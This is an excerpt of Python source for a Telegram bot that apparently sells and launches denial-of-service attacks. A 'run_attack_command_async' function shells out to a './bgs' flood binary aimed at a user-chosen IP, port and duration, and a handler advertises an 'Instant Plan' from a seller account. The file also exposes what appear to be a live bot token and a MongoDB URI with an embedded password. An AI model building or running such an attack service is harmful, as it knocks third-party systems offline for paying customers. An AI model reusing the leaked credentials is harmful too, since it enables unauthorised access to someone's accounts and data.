...
TOKEN = '7464963299:AAEgHNmFPsIKFe3WoG0ICsE_tTwVzj4T2RA'
MONGO_URI = 'mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net'
FORWARD_CHANNEL_ID = -1002149796937
CHANNEL_ID = -1002149796937
error_channel_id = -1002149796937
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./bgs {target_ip} {target_port} {duration} 20")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.reply_to(message, "*YOUR PAPA > @BGS_Owner*", parse_mode='Markdown')
    else:
...
if __name__ == "__main__":
    ...
    logging.info("𝘽𝙊𝙏 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔\n\n\n𝙔𝙊𝙐𝙍 𝙋𝘼𝙋𝘼 > @𝘽𝙂𝙎_𝙊𝙬𝙣𝙚𝙧\n𝙔𝙊𝙐𝙍 𝙋𝘼𝙋𝘼 > @𝘽𝙂𝙎_𝙊𝙬𝙣𝙚𝙧\n𝙔𝙊𝙐𝙍 𝙋𝘼𝙋𝘼 > @𝘽𝙂𝙎_𝙊𝙬𝙣𝙚𝙧...")
    while True:
        try:
